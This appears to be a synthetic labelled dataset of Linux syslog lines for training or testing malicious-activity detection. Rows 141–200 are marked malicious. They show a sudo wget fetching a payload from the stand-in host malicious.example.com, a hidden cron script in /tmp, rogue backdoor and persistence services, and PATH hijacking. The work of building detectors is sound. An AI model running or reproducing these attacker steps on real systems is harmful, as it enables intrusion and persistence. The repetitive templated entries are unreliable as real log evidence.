id,log_text,label
1,Jan 3 14:43:15 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
2,Jan 19 02:03:27 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
3,Jan 3 10:30:34 kernel: [ 1234.56 ] USB device plugged in.,normal
4,Jan 4 13:14:20 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
5,Jan 21 22:38:07 kernel: [ 1234.56 ] USB device plugged in.,normal
6,Jan 21 00:23:52 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
7,Jan 20 09:19:49 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
8,Jan 3 17:22:03 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
9,Jan 1 06:25:34 kernel: [ 1234.56 ] USB device plugged in.,normal
10,Jan 26 19:13:36 kernel: [ 1234.56 ] USB device plugged in.,normal
11,Jan 15 04:55:21 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
12,Jan 5 23:46:18 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
13,Jan 9 14:50:09 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
14,Jan 11 15:57:16 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
15,Jan 11 01:09:43 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
16,Jan 6 19:33:05 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
17,Jan 14 23:03:49 ubuntu sshd[2210]: Accepted password for user from 192.168.1.225 port 55822 ssh2,normal
18,Jan 18 06:30:58 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
19,Jan 18 18:18:38 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
20,Jan 28 13:41:54 ubuntu sshd[2210]: Accepted password for user from 192.168.1.203 port 55822 ssh2,normal
21,Jan 23 02:51:09 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
22,Jan 16 22:13:06 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
23,Jan 12 20:46:10 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
24,Jan 22 09:20:25 kernel: [ 1234.56 ] USB device plugged in.,normal
25,Jan 3 04:34:17 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
26,Jan 25 08:15:24 ubuntu sshd[2210]: Accepted password for user from 192.168.1.104 port 55822 ssh2,normal
27,Jan 28 02:07:46 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
28,Jan 28 19:58:03 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
29,Jan 27 16:23:44 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
30,Jan 26 03:19:20 kernel: [ 1234.56 ] USB device plugged in.,normal
31,Jan 11 14:22:54 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
32,Jan 14 13:14:11 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
33,Jan 15 00:27:29 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
34,Jan 11 07:29:24 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
35,Jan 7 12:59:23 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
36,Jan 11 22:37:40 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
37,Jan 5 11:04:55 ubuntu sshd[2210]: Accepted password for user from 192.168.1.200 port 55822 ssh2,normal
38,Jan 14 14:56:13 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
39,Jan 16 01:55:49 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
40,Jan 13 00:39:24 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
41,Jan 10 17:59:21 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
42,Jan 22 21:50:08 kernel: [ 1234.56 ] USB device plugged in.,normal
43,Jan 25 06:19:37 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
44,Jan 2 02:44:52 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
45,Jan 11 23:03:42 ubuntu sshd[2210]: Accepted password for user from 192.168.1.198 port 55822 ssh2,normal
46,Jan 2 07:44:12 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
47,Jan 19 06:36:19 kernel: [ 1234.56 ] USB device plugged in.,normal
48,Jan 20 23:40:42 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
49,Jan 8 02:37:18 ubuntu sshd[2210]: Accepted password for user from 192.168.1.208 port 55822 ssh2,normal
50,Jan 1 23:02:04 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
51,Jan 2 17:11:09 kernel: [ 1234.56 ] USB device plugged in.,normal
52,Jan 9 21:46:45 kernel: [ 1234.56 ] USB device plugged in.,normal
53,Jan 7 21:35:52 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
54,Jan 3 04:41:48 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
55,Jan 9 23:31:12 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
56,Jan 26 11:15:29 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
57,Jan 18 19:25:52 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
58,Jan 6 01:27:53 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
59,Jan 18 03:02:49 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
60,Jan 22 21:19:23 kernel: [ 1234.56 ] USB device plugged in.,normal
61,Jan 12 09:10:48 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
62,Jan 24 05:12:10 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
63,Jan 27 06:27:26 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
64,Jan 22 07:58:09 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
65,Jan 25 14:14:54 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
66,Jan 8 17:16:06 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
67,Jan 5 00:53:04 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
68,Jan 8 07:39:50 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
69,Jan 22 19:49:23 ubuntu sshd[2210]: Accepted password for user from 192.168.1.173 port 55822 ssh2,normal
70,Jan 3 12:52:03 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
71,Jan 25 00:01:03 kernel: [ 1234.56 ] USB device plugged in.,normal
72,Jan 22 15:16:15 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
73,Jan 12 20:40:29 kernel: [ 1234.56 ] USB device plugged in.,normal
74,Jan 25 01:30:38 ubuntu sshd[2210]: Accepted password for user from 192.168.1.109 port 55822 ssh2,normal
75,Jan 5 15:27:48 ubuntu sshd[2210]: Accepted password for user from 192.168.1.7 port 55822 ssh2,normal
76,Jan 5 07:44:37 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
77,Jan 22 18:05:20 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
78,Jan 2 22:01:33 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
79,Jan 27 14:54:11 kernel: [ 1234.56 ] USB device plugged in.,normal
80,Jan 26 10:33:25 kernel: [ 1234.56 ] USB device plugged in.,normal
81,Jan 1 14:09:12 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
82,Jan 28 07:43:02 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
83,Jan 10 02:04:27 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
84,Jan 6 20:26:22 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
85,Jan 11 17:58:21 ubuntu sshd[2210]: Accepted password for user from 192.168.1.66 port 55822 ssh2,normal
86,Jan 16 15:17:59 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
87,Jan 21 13:34:25 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
88,Jan 16 11:28:07 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
89,Jan 1 17:01:29 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
90,Jan 21 11:32:20 ubuntu sshd[2210]: Accepted password for user from 192.168.1.170 port 55822 ssh2,normal
91,Jan 23 02:56:06 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
92,Jan 6 06:13:15 ubuntu sshd[2210]: Accepted password for user from 192.168.1.111 port 55822 ssh2,normal
93,Jan 9 03:55:06 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
94,Jan 14 03:44:41 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
95,Jan 25 20:44:58 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
96,Jan 23 15:59:59 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
97,Jan 18 14:44:29 ubuntu sshd[2210]: Accepted password for user from 192.168.1.89 port 55822 ssh2,normal
98,Jan 1 10:01:55 ubuntu sshd[2210]: Accepted password for user from 192.168.1.44 port 55822 ssh2,normal
99,Jan 5 10:49:58 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
100,Jan 12 19:09:12 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
101,Jan 21 18:29:35 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
102,Jan 5 07:32:13 kernel: [ 1234.56 ] USB device plugged in.,normal
103,Jan 9 08:54:01 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
104,Jan 1 17:09:26 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
105,Jan 8 00:47:43 ubuntu sshd[2210]: Accepted password for user from 192.168.1.211 port 55822 ssh2,normal
106,Jan 27 17:00:34 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
107,Jan 28 12:30:04 kernel: [ 1234.56 ] USB device plugged in.,normal
108,Jan 5 02:27:40 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
109,Jan 26 19:11:24 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
110,Jan 1 03:45:54 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
111,Jan 11 12:10:59 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
112,Jan 4 08:49:55 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
113,Jan 28 00:30:05 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
114,Jan 11 01:02:36 kernel: [ 1234.56 ] USB device plugged in.,normal
115,Jan 1 22:14:38 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
116,Jan 20 08:24:56 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
117,Jan 23 23:59:28 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
118,Jan 11 06:26:10 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
119,Jan 15 10:37:45 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
120,Jan 2 15:06:57 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
121,Jan 16 20:01:56 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
122,Jan 6 02:20:35 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
123,Jan 16 12:25:35 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
124,Jan 22 19:58:49 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
125,Jan 4 23:07:31 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
126,Jan 23 16:33:29 ubuntu sshd[2210]: Accepted password for user from 192.168.1.60 port 55822 ssh2,normal
127,Jan 16 07:08:31 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
128,Jan 23 09:48:36 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
129,Jan 4 08:48:23 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
130,Jan 8 16:26:01 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
131,Jan 9 07:54:44 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
132,Jan 16 01:32:17 ubuntu sshd[2210]: Accepted password for user from 192.168.1.202 port 55822 ssh2,normal
133,Jan 23 17:01:56 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
134,Jan 11 09:19:07 ubuntu sshd[2210]: Accepted password for user from 192.168.1.50 port 55822 ssh2,normal
135,Jan 1 11:03:06 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
136,Jan 25 06:51:29 ubuntu sshd[2210]: Accepted password for user from 192.168.1.170 port 55822 ssh2,normal
137,Jan 11 07:29:14 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
138,Jan 12 16:41:29 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
139,Jan 14 18:51:49 ubuntu sshd[2210]: Accepted password for user from 192.168.1.200 port 55822 ssh2,normal
140,Jan 25 12:39:17 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
141,Jan 4 02:34:55 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
142,Jan 23 03:27:58 ubuntu systemd[1]: Enabled suspicious service sys_backdoor.service,malicious
143,Jan 27 11:50:39 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
144,Jan 17 06:29:41 ubuntu systemd[1]: Created rogue service persistence-upd.service,malicious
145,Jan 6 04:01:49 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
146,Jan 14 08:36:39 ubuntu systemd[1]: Enabled suspicious service sys_backdoor.service,malicious
147,Jan 18 20:51:14 ubuntu kernel: Unauthorized access attempt detected at /etc/systemd/system/,malicious
148,Jan 13 22:51:43 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
149,Jan 1 03:42:05 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
150,Jan 17 11:19:56 ubuntu systemd[1]: Created rogue service persistence-upd.service,malicious
151,Jan 11 01:20:56 ubuntu systemd[1]: Created rogue service persistence-upd.service,malicious
152,Jan 23 12:33:51 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
153,Jan 23 10:42:42 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
154,Jan 8 07:08:13 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
155,Jan 16 07:14:10 ubuntu systemd[1]: Enabled suspicious service sys_backdoor.service,malicious
156,Jan 27 10:11:20 ubuntu systemd[1]: Enabled suspicious service sys_backdoor.service,malicious
157,Jan 18 13:36:16 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
158,Jan 22 02:02:51 ubuntu kernel: Unauthorized access attempt detected at /etc/systemd/system/,malicious
159,Jan 18 12:28:29 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
160,Jan 6 05:17:27 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
161,Jan 16 13:46:39 ubuntu systemd[1]: Created rogue service persistence-upd.service,malicious
162,Jan 2 19:39:11 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
163,Jan 28 21:45:50 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
164,Jan 16 09:29:55 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
165,Jan 3 01:02:54 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
166,Jan 3 22:05:50 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
167,Jan 12 14:03:37 ubuntu kernel: Unauthorized access attempt detected at /etc/systemd/system/,malicious
168,Jan 22 04:26:53 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
169,Jan 20 15:27:39 ubuntu kernel: Unauthorized access attempt detected at /etc/systemd/system/,malicious
170,Jan 28 09:01:03 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
171,Jan 27 12:51:28 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
172,Jan 9 10:20:02 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
173,Jan 27 05:34:39 ubuntu systemd[1]: Created rogue service persistence-upd.service,malicious
174,Jan 9 04:08:49 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
175,Jan 25 17:08:39 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
176,Jan 7 20:00:38 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
177,Jan 3 06:59:30 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
178,Jan 17 13:38:55 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
179,Jan 12 11:35:42 ubuntu systemd[1]: Enabled suspicious service sys_backdoor.service,malicious
180,Jan 4 18:45:11 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
181,Jan 1 00:39:16 ubuntu systemd[1]: Created rogue service persistence-upd.service,malicious
182,Jan 1 08:56:14 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
183,Jan 14 21:10:28 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
184,Jan 11 02:21:51 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
185,Jan 28 14:30:23 ubuntu kernel: Unauthorized access attempt detected at /etc/systemd/system/,malicious
186,Jan 11 02:22:49 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
187,Jan 27 21:09:19 ubuntu systemd[1]: Created rogue service persistence-upd.service,malicious
188,Jan 13 16:42:35 ubuntu kernel: Unauthorized access attempt detected at /etc/systemd/system/,malicious
189,Jan 2 14:36:21 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
190,Jan 9 00:43:47 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
191,Jan 10 21:41:02 ubuntu kernel: Unauthorized access attempt detected at /etc/systemd/system/,malicious
192,Jan 24 00:26:13 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
193,Jan 20 16:10:21 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
194,Jan 10 00:09:42 ubuntu kernel: Unauthorized access attempt detected at /etc/systemd/system/,malicious
195,Jan 21 10:06:51 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
196,Jan 12 06:41:42 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
197,Jan 3 14:12:03 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
198,Jan 27 04:46:58 ubuntu systemd[1]: Enabled suspicious service sys_backdoor.service,malicious
199,Jan 9 09:57:46 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
200,Jan 15 03:19:00 ubuntu kernel: Unauthorized access attempt detected at /etc/systemd/system/,malicious
